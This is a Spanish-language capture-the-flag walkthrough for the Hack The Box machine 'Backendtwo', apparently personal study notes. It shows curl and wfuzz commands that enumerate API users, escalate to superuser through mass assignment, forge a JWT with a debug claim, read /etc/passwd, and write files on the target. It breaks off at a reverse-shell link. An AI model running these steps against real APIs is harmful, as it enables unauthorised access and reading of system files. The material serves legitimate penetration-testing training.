
![](assets/2022-06-23-08-17-49.png)

- Author: José Luis Íñigo
- Nickname: Riskoo
- Bibliographical sources: S4vitar
- Machine bakendtwo Hack the box
- REUSE EWPT eWPTXv2 OSWE
- Skills: API Enumeration Abusing API - Registering a user Accessing the Docs path of FastAPI Mass Assignment Attack (Becoming superusers) Abusing API - Reading system files Information Leakage Forge JWT (Assigning us an extra privilege) Abusing API - Creating a new file to achieve remote command execution (RCE) Abusing pam_wordle (Privilege Escalation)

## 1 hacemos el mapeo tipo s4vitar
ip 10.10.11.162
## 2 hacemos fuzz
```bash
wfuzz -c --hc=404 -L -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 10.10.11.162/FUZZ
```

## Hemos visto las rutas
Una vez vista las rutas, por ejemplo hemos visto api, si la ponemos , van saliendo opciones y queremos llegar hasta el admin o usuario

![](assets/2022-06-04-17-19-29.png)

Según la id nos devuelve un json

![](assets/2022-06-04-17-23-04.png)

Pues bien setún tenemos el Curl vamos a ordenarlo como un json que en curl es jq , filtrar por mail.

!!!Importante!! si no se tiene jq se instala apt-get install jq

![](assets/2022-06-04-17-26-58.png)

Ahora queremos que nos de un listado de todos los mails para verlos. No sabemos cuantos son por lo que pondremos por ejemplo 20. 

```bash
for i in {0..20};do curl -s X GET "http://10.10.11.162/api/v1/user/$i" | jq '.["email"]'; done
```

Le quitamos las " y los null
```bash
for i in {0..20};do curl -s X GET "http://10.10.11.162/api/v1/user/$i" | jq '.["email"]' | tr -d '"' | grep -v null; done
```

![](assets/2022-06-04-17-29-37.png)


Vemos que el dominio se trata de bakendtwo.htb , debemos de probar si realmente se ve algo diferente. 
En este caso no nos resuelve el dominio por lo que lo tenemos que meter en vhost para decirle que cuando ponga un dominio haga referencia a la ip que estamos usando, en este caso 10.10.11.162

Añadimos la ip y dominio
```bash
sudo nano /etc/hosts

#añadimos
10.10.11.162 backendtwo.htb
```
![](assets/2022-06-04-17-39-28.png)


Vamos a hacer fuzzing también en la parte del usuario por si encontramos algo

```bash
wfuzz -c --hc=404,422 --hh=4 -L -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 10.10.11.162/api/v1/user/FUZZ  
```
No encontramos nada interesante. El fuzzing viene por defecto con una consulta GET, así que vamos a forzar que sea PoST

```bash
#eliminamos los coidgos de estado etc de antes
wfuzz -c -X POST --hc=404,422 -L -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 10.10.11.162/api/v1/user/FUZZ     

```
![](assets/2022-06-04-18-08-07.png)

Encontramos interesante singup y login

# Hacemos una petción curl...
Como devuelve json vemos que devuelve

```bash
curl -s -X POST 10.10.11.162/api/v1/user/singup | jq
```
![](assets/2022-06-04-18-12-09.png)

Observamos que está'pidiendo como un cierto mensaje , por lo que hacemos prueba mandandole test con el parámetro -d
y vemos que ahora dice que el valor no es válido
```bash
curl -s -X POST "http://10.10.11.162/api/v1/user/signup" -d "test" | jq
```
![](assets/2022-06-04-18-13-38.png)

Vamos a intentar enviarlo con un json para ello aparte del formato hay que ponerle el Content-type que es application/json en la cabecera -H

```bash
curl -s -X POST "http://10.10.11.162/api/v1/user/signup" -H "Content-type: application/json" -d '{"test":"test"}' | jq
```

Y nos devuelve ahora que le puedes pasar un valor mail y otro password

![](assets/2022-06-04-18-17-50.png)

Así que vamos a intentar registrarons

```bash
curl -s -X POST "http://10.10.11.162/api/v1/user/signup" -H "Content-type: application/json" -d '{"email":"Riskoo@riskoo.com", "password":"Riskoolalala"}' | jq
```
Parece que le vale, por lo que ahora lo que intentaremos es loguearnos. Al usarlo vimos que en vez de email piden username así que lo cambiamos

```bash
curl -s -X POST "http://10.10.11.162/api/v1/user/login" -H "Content-type: application/json" -d '{"username":"Riskoo@riskoo.com", "password":"Riskoolalala"}' | jq
```


El resultado no es el esperado, esto suele pasar porque no espera un json sino un simple POST

```bash
curl -s -X POST "http://10.10.11.162/api/v1/user/login" -d 'username=Riskoo@riskoo.com&password=Riskoolalala' | jq
```

![](assets/2022-06-04-18-25-23.png)


Lo guardamos 
```bash
curl -s -X POST "http://10.10.11.162/api/v1/user/login" -d 'username=Riskoo@riskoo.com&password=Riskoolalala' | jq > accesstoken
```

# json web token
Cuando tenemos un json web token lo primero que hacemos es ir [jwt.io](https://jwt.io) y ver que nos dice

Supongamos que el token es: 


eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU1MjAyNjU2LCJpYXQiOjE2NTQ1MTE0NTYsInN1YiI6IjE0IiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjY2M2Y4ZjViLTI4MzAtNDIyNy1iMjcyLTM3ZWRjMGEwMGQ4MyJ9.eCUErju0R_56JfdmI1clayk-PMWg_XJ6QUSdTCu1EBk
Vamos a jwt.io



Si supiésemos el secreto base64 url (payload) podriamos convertirnos por ejemplo en superusuario poinendolo en true.

Vamos a Burpsuite 

# json web token
Cuando tenemos un json web token lo primero que hacemos es ir [jwt.io](https://jwt.io) y ver que nos dice

Supongamos que el token es: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU1MDUxMTMzLCJpYXQiOjE2NTQzNTk5MzMsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6ImVhZTAxNTY4LWZiY2ItNGQ5Ni1hODE1LWE2NjM1NWNkMTVmZCJ9.uLrBH8Sg07QKKPUBRLTZdElpd9hy0ZLTM_tSR-QWvUI

Vamos a jwt.io



Si supiésemos el secreto base64 url (payload) podriamos convertirnos por ejemplo en superusuario poinendolo en true.

Vamos a Burpsuite y utilizamos match and replace para cambiar la cabecera. En este caso le vamos a pasar Authorization: berare y el token que es lo que nos aparece y vamos a a ver que pasa.



🔥NEW🔥Importante🔥NEW🔥

Hay que tener en cuenta dos cosas. 

1º El token se renueva cada vez que nos logueamos, por lo que si nos salimos y volvmos en otro momento posiblemente haya cambiado, por lo que volvemos a hacer el curl

2º Importante haber lanzado el launch de burpsuite en modo normal con sh launch.sh sin el sudo

Pues bien queremos entrar en **docs** por que? porque cuando hemos hecho un curl nos aparece no authentification, por lo que vamos a autentificarnos añadiendo en la cabecera

Authorization: bearere máseltoken





Teniendo activado burpsuite para que haga el cambio de cabecera como hemos dicho antes, entramos en 10.10.11.167/docs , vemos que ha intercepato y que aparecen los datos bearer y token.Posteriormente dejamos de interceptar y debería de entrar.

Analizamos las cosas y vemos que en la parte de profile tiene el error de [mass Asignment Attack](/docs/Programs%20atack/know%20how%20mass%20Asignment%20Attack#mass-asignnment-attack) por lo que esplotamos y ponemos en true el usuario




🔥NEW🔥Importante🔥NEW🔥🔥NEW🔥Importante🔥NEW🔥
Con esto yendo a la parte de obtenerflag ya lo tendriamos resuelto pero vamos a intentar tomar mas poderes

Ahora una vez logueados vamos a intentar leer el /etc/passwd
Tengo que ver cual es el encode





Vemos que lo lee




Ahora vamos a intentar escribir un archivo y vemos que nos da un error del token por lo que vamos a hacernos un script. Pese a que somos administrador el problema reside en el token por lo que vimos de la palabra secreta.

```json
{
  "detail": "Debug key missing from JWT"
}
```

Nos está diciendo en detalles del error que estaba esperando un campo DEBUG

Nos copiamos la peticion get que hacíamos dentro de la administracion para leer un archivo y que vimos que funcionaba

```bash
curl -X 'GET' \
  'http://10.10.11.162/api/v1/admin/file/L2V0Yy9wYXNzd2Q%3D' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU1Mjc3OTkzLCJpYXQiOjE2NTQ1ODY3OTMsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODllN2Y3ZDUtZjFkMy00NjM4LWEzNGQtNWU4MTUyNDU0ZjE0In0.hSsQU4-nxMGfCj2EdyuF7c_W5jIUeaON8-WdblCoKYg'
```
🔥NEW🔥Importante🔥NEW🔥🔥NEW🔥Importante🔥NEW🔥

Ver el script 5-scripts / getFile.sh

## Usando el script getFile
Usando el script GetFile vemos los que terminan en sh
```bash
sudo ./getFile.sh -f /etc/passwd | grep "sh$"
[sudo] contraseña para riskoo: 
root:x:0:0:root:/root:/bin/bash
htb:x:1000:1000:htb:/home/htb:/bin/bash
```
Ahora podriamos ver la flag al ver el usuario htb y el directorio /home/htb

```bash
❯ sudo ./getFile.sh -f /home/htb/user.txt
fb89a1a550ae42f603bbee5904b1f409


 el nombre del archivo es: /home/htb/user.txt
```

## json webtoken

Lo que queremos es obtener la palabra clave necesaria para construir nuestro token como administrador y entrar teniendo el control completo

Para ello vamos a ir investigando archivos y siguiendo la traza


🔥Importante🔥 Mirar como se obtiene el token dentro de una vez dentro de linux.md

Ahora tenemos un token que es administrador 

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU1Mjc3OTkzLCJpYXQiOjE2NTQ1ODY3OTMsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODllN2Y3ZDUtZjFkMy00NjM4LWEzNGQtNWU4MTUyNDU0ZjE0IiwiZGVidWciOnRydWV9.SaE7rWih1omJ5dVYpVRQxrrvcd9ro8NxwtrHby4_9z4

## vamos a escribir en la máquina un archivo 

En la web vimos que hay una zona de escritura que la petición que hace es

```bash
curl -X 'POST' \
  'http://10.10.11.162/api/v1/admin/file/L2V0Yy9wYXNzd2Q%3D' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU1Mjc3OTkzLCJpYXQiOjE2NTQ1ODY3OTMsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODllN2Y3ZDUtZjFkMy00NjM4LWEzNGQtNWU4MTUyNDU0ZjE0In0.hSsQU4-nxMGfCj2EdyuF7c_W5jIUeaON8-WdblCoKYg' \
  -H 'Content-Type: application/json' \
  -d '{
  "file": "hola chavalito"
}'
```

Vamos a arreglarla y le vamos a camibar el token

```bash
curl -s -X POST "http://10.10.11.162/api/v1/admin/file/$(echo -n "/tmp/pwned" | base64)" -H 'accept: application/json' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU1Mjc3OTkzLCJpYXQiOjE2NTQ1ODY3OTMsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODllN2Y3ZDUtZjFkMy00NjM4LWEzNGQtNWU4MTUyNDU0ZjE0IiwiZGVidWciOnRydWV9.SaE7rWih1omJ5dVYpVRQxrrvcd9ro8NxwtrHby4_9z4' -H 'Content-Type: application/json' -d '{"file": "hola chavalito"}'
```

Ahora comprobamos intentando leer el archivo

```bash
❯ sudo ./getFile.sh -f /home/htb/tmp/pwned
[sudo] contraseña para riskoo: 
parse error: Invalid numeric literal at line 1, column 9
no se ha encontrado un valor válido
❯ sudo ./getFile.sh -f /tmp/pwned
hola chavalito

 el nombre del archivo es: /tmp/pwned
```


## Revert shell
[Revertshell](docs/9- Programs atack/know how revert shell.md)

## obtener la contraseña
